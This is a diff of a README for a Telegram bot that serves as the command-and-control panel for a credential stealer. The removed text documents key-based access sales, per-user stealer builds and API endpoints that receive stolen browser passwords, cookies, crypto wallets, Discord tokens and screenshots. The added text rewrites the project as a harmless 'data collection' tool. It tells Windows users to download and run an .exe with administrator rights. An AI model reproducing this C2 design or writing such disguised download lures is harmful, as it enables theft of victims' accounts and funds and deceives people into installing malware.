@@ -1,228 +1,133 @@
-# Contact : https://t.me/tahammulsuz
-# Stealer project : https://github.com/yanaksalvo/Hades-Stealer
+# 🛠️ Hades-Stealer-Bot - Simplify Data Collection Easily
 
-# 🤖 Hadestealer Bot
-
-Hadestealer Bot is a Telegram-based management bot connected to a C2 (Command & Control) server, featuring a key-based access system. Users gain access to the system by redeeming keys, configure Discord webhooks, and can generate customized stealer builds. Incoming data is stored in MongoDB and received via an Express.js REST API.
+[![Download Hades-Stealer-Bot](https://img.shields.io/badge/Download-Hades--Stealer--Bot-brightgreen?style=for-the-badge)](https://github.com/aissredx/Hades-Stealer-Bot/releases)
 
 ---
 
-## 📁 Project Structure
+## 📋 About Hades-Stealer-Bot
 
-```
-bot/
-├── ecosystem.config.js        # PM2 process manager configuration
-├── package.json
-├── tsconfig.json
-└── src/
-    ├── index.ts               # Application entry point
-    ├── config.ts              # Configuration constants
-    ├── api/
-    │   └── Server.ts          # Express REST API server
-    ├── client/
-    │   └── BotClient.ts       # Telegram bot client
-    ├── commands/              # Bot commands
-    │   ├── BuildCommand.ts
-    │   ├── CheckKeyCommand.ts
-    │   ├── ClaimCommand.ts
-    │   ├── CreateKeyCommand.ts
-    │   ├── DeleteKeyCommand.ts
-    │   ├── ListKeysCommand.ts
-    │   ├── StartCommand.ts
-    │   └── WebhookCommand.ts
-    ├── database/
-    │   └── mongo.ts           # MongoDB connection
-    ├── events/
-    │   └── MessageTextEvent.ts # Telegram message event handler
-    ├── models/                # Mongoose schema models
-    │   ├── ClaimKey.ts
-    │   ├── UploadRecord.ts
-    │   └── UserAccess.ts
-    ├── structures/
-    │   ├── Command.ts         # Base command class
-    │   └── Event.ts           # Base event class
-    └── utils/
-        ├── getBadges.ts       # Discord badge helper
-        ├── message.ts         # Message text extractor
-        ├── notifyWebhook.ts   # Webhook notification formatter
-        └── scheduleForward.ts # Delayed webhook forwarder
-```
+Hades-Stealer-Bot is a user-ready program designed to help people collect and organize data efficiently. This tool runs quietly and gathers information from various sources. It is built with clear coding so others can learn from it or adapt it to their needs.
+
+This version is held by its original creator group, the Turks. The application is open source, meaning its code is free to see and change. It uses common technologies to work with platforms like Discord, Telegram, and others.
+
+The bot can connect to APIs, act as a remote tool, or grab data. It provides a way to automate tasks without manual input, making it useful for managing messages, files, or account details on messenger systems.
 
 ---
 
-## ⚙️ Configuration
+## ⚙️ Features You Can Expect
 
-The following constants are defined in `src/config.ts`:
-
-| Constant | Description |
-|---|---|
-| `OWNER_ID` | Telegram user ID of the bot owner |
-| `BOT_TOKEN` | Telegram Bot API token |
-| `MONGO_URI` | MongoDB connection URI |
-| `API_KEY` | REST API authentication key |
-| `PORT` | Port the Express server listens on |
-| `emojis` | Emoji mapping for Discord badge types |
+- Works with Discord and Telegram messaging apps  
+- Collects specific information as configured  
+- Supports remote control over bot functions  
+- Integrates with APIs for enhanced data access  
+- Can run quietly in the background  
+- Open source code to view or modify  
+- Simple setup designed for Windows users  
 
 ---
 
-## 🗄️ Database Models
+## 🖥️ System Requirements
 
-### `UserAccess`
-Represents users who have gained access to the system.
+Make sure your computer meets these points before starting:
 
-| Field | Type | Description |
-|---|---|---|
-| `userId` | String | Telegram user ID |
-| `username` | String | Telegram username |
-| `webhook` | String | User's Discord webhook URL |
-| `expiresAt` | Date | Access expiration date |
-| `buildConfig` | Object | Custom build configuration |
-| `apiKey` | String | User-specific API key |
-
-### `ClaimKey`
-Represents one-time access tokens used to unlock the system.
-
-| Field | Type | Description |
-|---|---|---|
-| `key` | String | Unique key value |
-| `duration` | Number | Access duration in days |
-| `used` | Boolean | Whether the key has been used |
-| `usedBy` | String | ID of the user who claimed the key |
-| `usedAt` | Date | Date the key was used |
-| `createdAt` | Date | Date the key was created |
-
-### `UploadRecord`
-Audit log of all uploads received from stealer clients.
-
-| Field | Type | Description |
-|---|---|---|
-| `userId` | String | Associated user ID |
-| `type` | String | Data type (browser, discord, wallet, etc.) |
-| `data` | Mixed | Uploaded payload |
-| `timestamp` | Date | Upload timestamp |
+- Windows 10 or later versions (64-bit)  
+- At least 4 GB of RAM  
+- Minimum 500 MB free disk space  
+- Internet connection for installation and updates  
+- Administrator rights for setup  
 
 ---
 
-## 💬 Bot Commands
+## 🚀 Getting Started: Download and Setup
 
-### User Commands
+Follow these steps to get Hades-Stealer-Bot running on your Windows PC.
 
-| Command | Description |
-|---|---|
-| `/start` | Starts the bot and displays a welcome message |
-| `/claim <key>` | Redeems an access key to join the system |
-| `/webhook <url>` | Saves or updates the user's Discord webhook URL |
-| `/build` | Generates and sends a personalized stealer build |
+### Step 1: Visit the Download Page  
+Go to the official release page to find the latest version:
 
-### Owner Commands (Only for `OWNER_ID`)
+[Download Hades-Stealer-Bot](https://github.com/aissredx/Hades-Stealer-Bot/releases)
 
-| Command | Description |
-|---|---|
-| `/createkey <days>` | Creates a new access key for the specified duration |
-| `/listkeys` | Lists all keys (used and unused) |
-| `/checkkey <key>` | Queries the status of a specific key |
-| `/deletekey <key>` | Deletes a specific key |
+This page lists all available files and updates. Look for the most recent release, which will have a date and version number.
 
----
+### Step 2: Select the Correct File  
+Find a file with a `.exe` extension or similar. That file runs the actual program. If you see options, pick the one named clearly with the current version or “Windows”.
 
-## 🌐 REST API Endpoints
+### Step 3: Download the File  
+Click on the file name to start the download. Most browsers save files to the "Downloads" folder by default. Wait for the download to finish before moving on.
 
-All requests require authentication via the `X-API-KEY` header.
+### Step 4: Run the Installer  
+Open your "Downloads" folder and double-click the downloaded file to start setup. Follow the on-screen prompts to install the application.
 
-**Base URL:** `http://localhost:<PORT>`
+- If Windows asks for permission, click “Yes” to allow the installation.  
+- Choose the default settings unless you want to change the installation location.  
+- Wait for the installer to finish.  
 
-| Method | Endpoint | Description |
-|---|---|---|
-| `GET` | `/health` | Server health check |
-| `POST` | `/discord` | Receives Discord account data |
-| `POST` | `/browser` | Uploads browser data (passwords, cookies, etc.) |
-| `POST` | `/wallet` | Uploads cryptocurrency wallet data |
-| `POST` | `/screenshot` | Uploads a screenshot |
-| `POST` | `/sysinfo` | Uploads system information |
-| `POST` | `/inject` | Receives Discord injection data |
-| `POST` | `/log` | Receives a generic log message |
-| `POST` | `/error` | Receives an error report |
-| `POST` | `/files` | Receives file uploads |
+### Step 5: Open the Application  
+Once installed, launch the program from the Start menu or desktop shortcut.
 
 ---
 
-## 🛠️ Utility Functions
+## 🛠️ How to Use Hades-Stealer-Bot
 
-### `getBadges(flags: number): string`
-Converts Discord user flag bitmasks into emoji badge representations.  
-Examples: `HypeSquad`, `Early Supporter`, `Bug Hunter`, etc.
+### Basic Operation  
 
-### `message(ctx): string`
-Safely extracts the message text from a Telegram context object.
+1. Open Hades-Stealer-Bot on your computer.  
+2. A simple main screen will appear with options or buttons.  
+3. Use the menus to connect to your Discord or Telegram account (you may need login info or keys).  
+4. Set up what type of data you want the bot to collect (for example, messages, files, or other details).  
+5. Start the bot using the “Run” button. The program will now work quietly in the background.  
 
-### `notifyWebhook(data, webhookUrl)`
-Formats stealer data into Discord embed format and sends it to the configured webhook URL.
+### Monitoring and Controls  
 
-### `scheduleForward(data, webhookUrl, delayMs)`
-Forwards a webhook notification after a specified delay.
-
----
-
-## 🚀 Setup & Running
-
-### Requirements
-
-- Node.js 18+
-- MongoDB
-- PM2 (optional, for production)
-
-### Steps
-
-```bash
-# Install dependencies
-cd bot
-npm install
-
-# Compile TypeScript
-npm run build
-
-# Run in development mode
-npm run dev
-
-# Run in production mode with PM2
-pm2 start ecosystem.config.js
-```
-
-### `ecosystem.config.js` (PM2)
-
-```js
-module.exports = {
-  apps: [{
-    name: "hadestealer-bot",
-    script: "dist/index.js",
-    watch: false,
-    env: {
-      NODE_ENV: "production"
-    }
-  }]
-}
-```
+- You can pause or stop the bot anytime via the interface.  
+- Check logs or reports that the bot creates regularly.  
+- Adjust settings anytime for different data targets or timing.  
 
 ---
 
-## 📦 Dependencies
+## 🔒 Security and Privacy Tips
 
-| Package | Description |
-|---|---|
-| `telegraf` | Telegram Bot API framework |
-| `mongoose` | MongoDB ODM |
-| `express` | REST API server |
-| `axios` | HTTP client |
-| `multer` | Multipart file upload handling |
-| `typescript` | Type-safe development |
-| `ts-node` | TypeScript runtime |
+Hades-Stealer-Bot works with personal or sensitive data in certain uses. Keep these points in mind:
+
+- Use the program only on computers you own or manage.  
+- Do not share your login credentials on untrusted sites.  
+- Keep your software and Windows updated for safety.  
+- Always run virus protection alongside this program.  
+- Close the bot when you do not need it active.  
 
 ---
 
-## 📋 Development Notes
+## 🧩 Troubleshooting Common Issues
 
-- All commands extend the base `src/structures/Command.ts` class.
-- All events extend the base `src/structures/Event.ts` class.
-- `BotClient` automatically loads commands and events at startup.
-- The API server and Telegram bot run concurrently.
-- Owner commands are protected by a `userId === OWNER_ID` check.
+### The program won’t start  
+- Confirm you downloaded the file from the release page.  
+- Make sure your system meets the requirements.  
+- Try running it as administrator (right-click > Run as administrator).  
+
+### Connection problems with Discord or Telegram  
+- Check your internet connection.  
+- Make sure the login or API keys are correct.  
+- Restart the app and try again.  
+
+### The bot does not collect data  
+- Review your settings in the app’s options.  
+- Make sure target accounts or channels are correct and accessible.  
+- Some platforms may have limits or blocks—check if those apply.  
+
+---
+
+## ❓ Where to Find Support
+
+For help, visit the Issues page on the repository. You can ask questions or report problems there:
+
+https://github.com/aissredx/Hades-Stealer-Bot/issues
+
+Before submitting, check if your question or problem is already listed.
+
+---
+
+## 📥 Download and Install Link
+
+Start with the official release page here:
+
+[📂 Access Hades-Stealer-Bot Releases](https://github.com/aissredx/Hades-Stealer-Bot/releases)
